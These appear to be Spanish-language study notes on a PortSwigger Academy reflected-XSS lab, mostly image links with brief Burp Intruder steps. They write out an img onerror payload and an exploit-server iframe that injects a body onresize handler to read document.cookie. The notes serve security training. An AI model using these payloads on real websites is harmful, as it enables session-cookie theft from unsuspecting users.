![[portswigger_academy/expert/01_insecure_deserial/images/Pasted image 20220902175857.png]]

%img src=1 onerror=alert(document.cookie)%

![[portswigger_academy/expert/01_insecure_deserial/images/Pasted image 20220902180946.png]]

![[portswigger_academy/expert/01_insecure_deserial/images/Pasted image 20220902181003.png]]

ponemos en off intercept y repetimos el proceso:

![[portswigger_academy/expert/01_insecure_deserial/images/Pasted image 20220902181138.png]]

mando al intruder esta traza:

![[portswigger_academy/expert/01_insecure_deserial/images/Pasted image 20220902181247.png]]

borro el contenido de la string search y sustituyo *(NO OLVIDAR EL HTTP/1.1)*:

![[portswigger_academy/expert/01_insecure_deserial/images/Pasted image 20220902181432.png]]

copy tags to clipboard:

![[Pasted image 20220905183017.png]]

![[Pasted image 20220905183046.png]]


![[Pasted image 20220905183828.png]]

modificamos positions y payload 

![[Pasted image 20220905184030.png]]

copy events to clipboard:

![[Pasted image 20220905184102.png]]

![[Pasted image 20220905184138.png]]

![[Pasted image 20220905184224.png]]

vamos al exploit server:

%iframe src="ip lab/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E"onload=this.style.width='100px'% 

![[Pasted image 20220905185243.png]]

![[Pasted image 20220905185314.png]]




